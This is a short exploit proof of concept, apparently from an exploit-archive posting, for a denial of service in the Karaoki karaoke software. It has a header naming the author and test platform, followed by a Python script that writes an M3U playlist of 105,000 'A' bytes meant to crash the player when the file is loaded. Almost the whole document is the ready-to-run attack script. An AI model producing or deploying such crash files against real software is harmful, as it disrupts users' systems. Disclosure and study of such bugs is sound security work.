#Exploit Title :Karaoki Denial of Service Vulnerability
#Software : Karaoki
#Software link : http://software-files-l.cnet.com/s/software/11/43/82/66/pcdj_karaoki_setup_0.6.3819.exe?e=1287174968&h=9dd7fd008e533071b8d4874fd9a01487&lop=link&ptype=1901&ontid=18502&siteId=4&edId=3&spi=918adb963da1de63d1bfc9fd1a36ab5a&pid=11438266&psid=75072918&fileName=pcdj_karaoki_setup_0.6.3819.exe
#Autor : ABDI MOHAMED
#Email : abdimohamed@hotmail.fr
#Software version : n/a
#Tested on : Win7 Ultimate fr

#!/usr/bin/python
outfile="killer.m3u"
junk="\x41" * 105000
FILE=open(outfile, "w")
FILE.write(junk)
FILE.close()
print "[+] File created succesufully ,( the hacker is who create something !!! ) [+]"